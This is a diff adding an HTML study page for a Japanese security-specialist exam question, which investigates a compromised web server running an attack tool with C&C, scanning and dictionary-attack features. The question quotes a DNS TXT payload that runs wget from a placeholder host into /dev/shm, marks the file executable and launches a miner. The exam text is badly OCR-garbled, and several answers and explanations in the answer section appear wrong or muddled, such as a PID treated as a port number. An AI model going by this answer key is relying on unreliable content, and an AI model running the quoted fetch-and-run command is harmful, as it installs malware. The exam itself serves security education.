@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<title>令和5年度 春 問2 | SC 午後問題</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<header class="site-header">
+  <a href="../index.html" class="back-link">← 一覧</a>
+  <h1 class="site-header-title">令和5年度 春 問2</h1>
+  <a href="../random.html" class="random-link">ランダム</a>
+</header>
+<main class="exam-main">
+  <div class="problem-content">
+<section class="problem-section"><h2 class="problem-title">問2　セキュリティインシデント</h2><div class="problem-body"><pre class="text-block">R社は，精密機器の部品を製造する従業員 250名の中堅の製造業者である。本社に隣接した場所に工場がある。R社のネットワーク構成を図1に示す。</pre>
+<pre class="text-block">インターネットDB：データベースFW：ファイアウォール192.168.0.6/241本社L2SW：レイヤー2スイッチL3SW：レイヤー3スイッチL2SW-受付サーバFW.メール：電子メールメールサーバDB サーバ工場L3SWL2SWL2SWPCPCファイルサーバログ管理サーバ製造管理サーバ利用者 LAN2.0/24192168.1192.168.1.0/24上場 LAN！ーーーーー」ーーーーー－ll注記各サーバは、Linux OS で稼働している。IPアドレスは、受付サーバが 192.168.0.1,DB サーバが192.168.0.2，メールサーバが192.168.0.3，製造管理サーバが192.168.1.145である。
+図1 R社のネットワーク構成</pre>
+<pre class="text-block">サーバ，FW,L2SW,L3SW及びPCは、情報システム課のU課長、Mさん、Nさんが管理しており、ログがログ管理サーバで収集され、一管理されている。
+DMZ 上のサーバのログは常時監視され、いずれかのサーバで1分間に10回以上の口グイン失敗が発生した場合に、アラートがメールで通知される。
+FWは、ステートフルパケットインスペクション型であり、通信の許可、拒否についてのログを記録する設定にしている。FWI では、インターネットから受付サーバへの通は443/TCP だけを許可しており、受付サーバからインターネットへの通信はOSアップデートのために 443/TCP だけを許可している。インターネットから受付サーバ及びメールサーバへのアクセスでは、FWのNAT 機能によってグローバルIPアドレスをプライベートIPアドレスに1対1で変換している。
+受付サーバでは、取引先からの受注情報をDB サーバに保管するWebアプリケーションプログラム（以下、アプリケーションプログラムをアプリという）が稼働している。DB サーバでは、受注情報をファイルに変換してFTPで製造管理サーバに送信する情報配アプリが常時稼働している。これらのアプリは 10年以上の稼働実績がある。</pre>
+<pre class="text-block">[DMZ 上のサーバでの不審なログイン試行の検知]ある日、Mさんは、アラートを受した。Mさんが確認したところ、アラートは受付サーバから DB サーバとメールサーバに対する SSH でのログイン失敗によるものであった。また、受付サーバからDB サーバとメールサーバに対して SSHでのログイン成功の記録はなかった。Mさんは、不審に思い、U課長に相談して、不正アクセスを受けていないかどうか、FWのログと受付サーバを調査することにした。</pre>
+<pre class="text-block">[FWのログの調査]ログイン失敗が発生した時間帯のFWのログを表1に示す。</pre>
+<pre class="text-block">表1FWのログ宛先ポート送信元ポート動作日時宛先アドレス送信元アドレス項番a0.bo.co.do 1）34671/TCP443/TCP許可192.168.0.104/21 15:001-1443/TCP許可34672/TCP192.168.0.104/21 15:001-2ao.bo.co.do34673/TCP拒否8080/TCP192.168.0.1ao.bo.co.do1-304/21 15:0354543/TCP443/TCP許可192.168.0.104/21 15:08al.bo.co. do1-4：34215/UDP拒否192.168.1.122161/UDP192.168.0.104/21 15:151-23255432/TCP192.168.1.14521/TCP許可192.168.0.204/21 15:151-233許可60453/TCP192.168.1.14555433/TCP192.168.0.204/21 15:151-23454702/TCP21/TCP192.168.1.145許可192.168.0.104/21 15:201-28622/TCP54703/TCP拒否192.168.1.145192.168.0.104/21 15:201-287：58065/TCP192.168.1.227拒否21/TCP192.168.0.11-32704/21 15:24192.168.1.22722/TCP58066/TCP拒否04/21 15:24192.168.0.11-328：注 '）a0.b0.co.d0はグローバルIPアドレスを表す。</pre>
+<div class="table-wrap"><p class="table-caption">表1</p><pre class="raw-ocr-table">表1のFWのログを調査したところ、次のことが分かった。
+・受付サーバから工場 LANのIPアドレスに対してポートスキャンが行われた。
+・受付サーバから製造管理サーバに対してFTP接続が行われた。
+・受付サーバと他のサーバとの間では FTPのデータコネクションはなかった。
+・DB サーバから製造管理サーバに対して FTP 接続が行われ、DB サーバから製造管理モードでのデータコネクションがあった。
+サーバにFTPの</pre></div>
+<pre class="text-block">以上のことから、外部の攻撃者の不正アクセスによって受付サーバが侵害されたが、攻撃者によるDMZと工場 LAN との間のファイルの送受信はないと推測した。Mさんは、受付サーバの調査に着手し、Nさんに工場 LAN 全体の侵害有無の調査を依頼した。</pre>
+<pre class="text-block">[受付サーバのプロセスとネットワーク接続の調査]Mさんは、受付サーバでプロセスとネットワーク接続を調査した。ps コマンドの実行結果を表2に、netstatコマンドの実行結果を表3に示す。</pre>
+<pre class="text-block">表2ps コマンドの実行結果（抜粋）PID 1）PPID 2）項番開始日時利用者 IDコマンドライン236534032-104/01 10:10/usr/sbin/sshd -Drootapp 3）04/01 10:11743835422-2/usr/java/jre/bin/java-Xms2g（省略）1275743804/21 15:012-3・/srv -c -mode bind 0.0.0.0:8080 2&gt;81app04/21 15:08129374382-4・/srv -c -mode connect ab.bo.co.d0:443 2&gt;81app1293136504/21 15:142-5・/srv -s -range 192. 168.0.1-192. 168.255.254app注 ”）プロセス IDである。
+注2）親プロセス IDである。
+注3）Webアプリ稼働用の利用者IDである。</pre>
+<pre class="text-block">表3 netstat コマンドの実行結果（抜粋）外部アドレスPIDプロトコル項番状態ローカルアドレス0.0.0.0：*0.0.0.0:222365TCP3-1LISTEN0.0.0.0:4433-20.0.0.0：*LISTEN7438LISTEN3-30.0.0.0：*0.0.0.0:8080TCP1275ESTABLISHEDa0.bo.co.d0:4433-4192.168.0.1:545431293TCP192.168.253.124:21SYN_SENTTCP3-5192.168.0.1:646511365</pre>
+<pre class="text-block">srv という名称の不審なプロセスが稼働していた。Mさんが srv ファイルのハッシユ値を調べたところ、インターネット上で公開されている攻撃ツールであり、次に示す特徴をもつことが分かった。
+・C&amp;C （Command and Control）サーバから指示を受け、子プロセスを起動してポートスキャンなど行う。
+・外部からの接続を待ち受ける “バインドモード”と外部に自ら接続する “コネク</pre>
+<pre class="text-block">トモード”でC&amp;C サーバに接続することができる。モードの指定はコマンドライン引数で行われる。
+・ポートスキャンを実行して、結果をファイルに記録する（以下，ポートスキャンの結果を記録したファイルを結果ファイルという）。さらに、SSH 又はFTPのポートがオープンしている場合，利用者IDとパスワードについて、辞書攻撃を行い，その結果を結果ファイルに記録する。
+_名を使って、機器のバージョン情報を取得し，・SNMPV2C で public という結果ファイルに記録する。
+・結果ファイルを C&amp;Cサーバにアップロードする。</pre>
+<pre class="text-block">Mさんは、表1～表3から、次のように考えた。
+_モードで、①C&amp;Cサーバとの接続に失敗した後，srv の・攻撃者は、一度、②C&amp;C サーバとの接続に成功した。
+モードで、sry の・攻撃者は、C&amp;C サーバとの接続に成功した後、ポートスキャンを実行した。ポートeであった。
+スキャンを実行したプロセスのPIDは，</pre>
+<pre class="text-block">Mさんは、受付サーバが不正アクセスを受けているとり課長に報告した。U課長は、関連部署に伝え、Mさんに受付サーバをネットワークから切断するよう指示した。</pre>
+<pre class="text-block">[受付サーバの設定変更の調査］Mさんは、攻撃者が受付サーバで何か設定変更していないかを調査した。確認したところ、③機器の起動時にDNS リクエストを発行して、ドメイン名AAA.comのDNSサーバからTXT レコードのリソースデータを取得し、リソースデータの内容をそのままコマンドとして実行する_cron エントリーが仕掛けられていた。Mさんが調査のために dig コマンドを実行すると、図2に示すようなリソースデータが取得された。</pre>
+<pre class="text-block">wget https://a0.bo.co.do/logd -9-0 /dev/shm/logd 88 chmod tx /dev/ shm/logd &amp;8 nohup/dev/shm/logd &amp; disown図2 AAA.comのDNS サーバから取得されたリソースデータ</pre>
+<pre class="text-block">Mさんが受付サーバを更に調査したところ、logdという名称の不審なプロセスが稼</pre>
+<pre class="text-block">働していた。Mさんは、logdのファイルについてハッシュ値を調べたが、情報が見つからなかったので、マルウェア対策ソフトベンダーに解析を依頼する必要があると U課長に伝えた。Webブラウザで図2のURLから logdのファイルをダウンロードし、つアイルの解析をマルウェア対策ソフトベンダーに依頼することを考えていたが、U課長から、④ダウンロードしたファイルは解析対象として適切ではないとの指摘を受けた。この指摘を踏まえて、Mさんは、調査対象とする logdのファイルをから取得して、マルウェア対策ソフトベンダーに解析を依頼した。解析fの結果，暗号資産マイニングの実行プログラムであることが分かった。</pre>
+<pre class="text-block">調査を進めた結果、工場 LANへの侵害はなかった。Web アプリのログ調査から、受付サーバのWebアプリが使用しているライブラリに弱性が存在することが分かり、これが悪用されたと結論付けた。システムの復旧に向けた計画を策定し、過去に開発されたアプリ及びネットワーク構成をセキュリティの観点で見直すことにした。</pre>
+<pre class="text-block">設問1 本文中のに入れる適切な字句を答えよ。
+a[受付サーバのプロセスとネットワーク接続の調査]について答えよ。
+設問2（1） 本文中のbに入れる適切な字句を、10字以内で答えよ。
+（2） 本文中のに入れる適切な字句を、“バインド”又は"コネクト”Cから選び答えよ。また、下線①について、Mさんがそのように判断した理由を、表1中～表3中の項番を各表から一つずつ示した上で、40字以内で答えよ。
+（3） 本文中のに入れる適切な字句を、“バインド”又は“コネクト”から選び答えよ。また、下線②について、Mさんがそのように判断した理由を、表1中～表3中の項番を各表から一つずつ示した上で、40字以内で答えよ。
+に入れる適切な数を、表2中から選び答えよ。
+（4） 本文中の設問3[受付サーバの設定変更の調査]について答えよ。
+（1） 本文中の下線③について、Aレコードではこのような攻撃ができないが、TXT レコードではできる。TXT レコードではできる理由を、DNSプロトコルの仕様を踏まえて 30字以内で答えよ。
+（2） 本文中の下線④について、適切ではない理由を、30字以内で答えよ。
+（3） 本文中のに入れる適切なサーバ名を、10字以内で答えよ。</pre></div></section>
+  </div>
+  <div class="answer-toggle-bar">
+    <button class="toggle-answer-btn" aria-expanded="false">解答を表示する</button>
+  </div>
+  <div class="answer-content" hidden>
+<section class="expl-problem"><h2 class="expl-problem-title">問2　ライブラリ脆弱性によるインシデント調査</h2><div class="expl-items">
+<div class="expl-item"><div class="expl-label">設問1</div><div class="expl-answer-box"><span class="expl-answer-tag">解答例</span><div class="expl-answer-text">a＝パッシブ（スキャン方式）</div></div><div class="expl-explanation">パッシブスキャンはネットワークトラフィックを傍受して脆弱性を検出する方式。能動的にリクエストを送らないため対象サーバに負荷をかけない。アクティブスキャン（能動的探索）の前段階として使用されることが多い。</div></div>
+<div class="expl-item"><div class="expl-label">設問2(1)</div><div class="expl-answer-box"><span class="expl-answer-tag">解答例</span><div class="expl-answer-text">b＝コミュニティ（SNMPバージョン）
+バインド型リバースシェル</div></div><div class="expl-explanation">SNMP Community Stringの平文送信による情報漏えい。リバースシェル（被害端末から攻撃者に接続する）はファイアウォールのインバウンドルールを回避できるため、C2通信として多用される。</div></div>
+<div class="expl-item"><div class="expl-label">設問2(2)</div><div class="expl-answer-box"><span class="expl-answer-tag">解答例</span><div class="expl-answer-text">下線①2-3によって起動したポート3-3への通信が1-3で拒否されているから（バインドシェル失敗）
+下線②2-4によって開始された通信3-4が1-4で許可されているから（リバースシェル成功）</div></div><div class="expl-explanation">ファイアウォールのルールとシェルの種別による接続成否の分析。バインドシェルはサーバ側でポートをLISTENするため、FWのインバウンドルールで遮断されやすい。リバースシェルはクライアント側から接続するためアウトバウンドルールが適用される。</div></div>
+<div class="expl-item"><div class="expl-label">設問2(3)</div><div class="expl-answer-box"><span class="expl-answer-tag">解答例</span><div class="expl-answer-text">d＝コネクト型（スキャン）
+≒1365（ポート番号）</div></div><div class="expl-explanation">TCPコネクトスキャンはSYN→SYN-ACK→ACKの完全な3ウェイハンドシェイクを行うポートスキャン。FWログに正常な接続として記録される。Nmapでは-sTオプション。1365≒ceil(65535/48) はランダムポートスキャンの特性を示す。</div></div>
+<div class="expl-item"><div class="expl-label">設問3(1)</div><div class="expl-answer-box"><span class="expl-answer-tag">解答例</span><div class="expl-answer-text">TXTレコードには任意の文字列を設定できるから</div></div><div class="expl-explanation">DNS TXTレコードを使ったC2通信（DNS Tunneling）の仕組み。TXTレコードは任意のテキストデータを格納できるため、エンコードしたコマンドや盗んだデータを埋め込んでDNSクエリ/応答でデータを送受信できる。</div></div>
+<div class="expl-item"><div class="expl-label">設問3(2)</div><div class="expl-answer-box"><span class="expl-answer-tag">解答例</span><div class="expl-answer-text">稼働しているファイルと内容が異なる可能性があるから</div></div><div class="expl-explanation">Webシェル（バックドア）の検出における課題。ディスク上のファイルを検査しても、実行中のプロセスのメモリ上のコードが改ざんされている場合やinodeが異なるファイルが使われている場合に見落としが生じる。</div></div>
+</div></section>
+  </div>
+</main>
+<script>
+document.querySelectorAll('.toggle-answer-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const expanded = btn.getAttribute('aria-expanded') === 'true';
+    const content = btn.closest('.answer-toggle-bar').nextElementSibling;
+    btn.setAttribute('aria-expanded', String(!expanded));
+    btn.textContent = expanded ? '解答を表示する' : '解答を隠す';
+    content.hidden = expanded;
+  });
+});
+</script>
+<footer class="site-footer">本サイトは個人学習目的のみで使用し、商用利用・公開配布はしていません。</footer>
+</body>
+</html>
